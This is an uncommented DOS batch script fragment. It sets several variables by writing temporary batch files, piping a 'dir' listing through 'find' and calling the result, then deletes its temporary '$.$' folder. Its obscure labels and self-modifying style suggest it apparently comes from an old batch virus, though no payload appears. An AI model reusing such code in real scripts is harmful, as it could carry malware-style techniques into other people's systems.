if "%1"=="sp1it" goto mdas
if "%1"=="sp2it" goto mdos
set r=%TEMP%
set TEMP=
md $.$
cd $.$
echo set t=%%1>$rnd0.bat
dir /w /l /o-e /a-d | find "$rnd0.bat">$rnd2.bat
call $rnd2
set TEMP=%r%
set r=
del $rnd?.bat
set r=%TEMP%
set TEMP=
echo set y=%%1>$rnd0.bat
dir /w /l /o-e /a-d | find "$rnd0.bat">$rnd2.bat
call $rnd2
set TEMP=%r%
set r=
del $rnd?.bat
set r=%TEMP%
set TEMP=
echo set n=%%1>$rnd0.bat
dir /w /l /o-e /a-d | find "$rnd0.bat">$rnd2.bat
call $rnd2
set TEMP=%r%
set r=
del $rnd?.bat
set r=%TEMP%
set TEMP=
echo set s=%%1>$rnd0.bat
goto mnets
:mdos
echo set susdem=%h%>asdf.bat
call asdf.bat
goto msus
:mdas
set r=%TEMP%
set TEMP=
md $.$
cd $.$
echo set h=%%1>$rnd0.bat
:mnets
dir /w /l /o-e /a-d | find "$rnd0.bat">$rnd2.bat
call $rnd2
set TEMP=%r%
set r=
del $rnd?.bat
cd ..
rd $.$
:msus